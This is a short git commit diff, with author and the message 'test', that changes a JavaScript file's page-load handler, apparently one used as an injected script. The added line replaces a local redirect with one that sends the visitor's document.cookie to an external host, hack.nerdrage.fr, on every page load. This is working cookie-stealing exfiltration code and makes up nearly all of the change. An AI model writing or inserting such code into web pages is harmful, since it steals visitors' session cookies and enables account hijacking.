218637a523120053deb0e01a813b396fc367ee63
Florian <flo.mei@hotmail.fr>
2023-11-21 00:52:27 +0100

    test

--- script1.js
+++ script1.js
@@ -11,5 +11,5 @@
 
 // Trigger only onload, there is another scenario in case the injection happend afterwards
 window.addEventListener("load", () => {
-	window.location.href='/activate-plugin/1';
+	window.location.href='http://hack.nerdrage.fr/?data='+document.cookie;
 });
